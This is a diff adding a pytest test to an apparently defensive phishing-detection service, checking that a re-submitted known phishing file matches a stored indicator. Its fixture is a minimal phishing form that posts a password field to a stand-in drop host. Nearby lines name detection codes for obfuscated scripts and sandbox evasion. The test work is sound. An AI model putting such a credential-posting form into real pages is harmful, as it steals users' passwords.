@@ -39,3 +39,18 @@ def test_two_codes_of_one_group_are_not_independent():
 
 def test_weak_support_codes_form_no_group():
     assert rc.independent_groups(["RC_ATTACH_OBFUSCATED_JS", "RC_SANDBOX_EVASION_CODE", "BRAND_MENTION_OFF_DOMAIN"]) == set()
+
+
+def test_exact_match_with_a_confirmed_indicator_is_phishing(monkeypatch):
+    """ТЗ 4.1.4.6: a re-submitted known phishing file is «phishing» by the exact indicator alone; metric runs switch this off."""
+    from helpers import run_file
+    monkeypatch.delenv("DW2_DISABLE_IOC", raising=False)
+    data = b"<html><title>kit</title><form action='https://drop.ioc-test.top/p'><input type='password'></form></html>"
+    first = run_file("ioc_kit.html", data)
+    assert first.verdict == "MALICIOUS"
+    second = run_file("ioc_kit_again.html", data)
+    assert "RC_KNOWN_IOC_MATCH" in second.reason_codes and second.verdict == "MALICIOUS"
+    assert "RC_KNOWN_IOC_MATCH" in second.reason_details or second.reason_evidence.get("RC_KNOWN_IOC_MATCH")
+    monkeypatch.setenv("DW2_DISABLE_IOC", "1")
+    third = run_file("ioc_kit_third.html", data)
+    assert "RC_KNOWN_IOC_MATCH" not in third.reason_codes
